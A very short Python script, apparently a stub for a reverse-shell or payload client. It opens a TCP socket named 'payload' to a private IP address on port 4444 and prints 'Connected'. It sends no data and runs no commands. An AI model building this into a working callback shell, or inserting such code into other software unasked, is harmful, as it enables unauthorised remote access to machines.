import socket

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
payload.connect(("192.168.43.26", 4444))
print("Connected")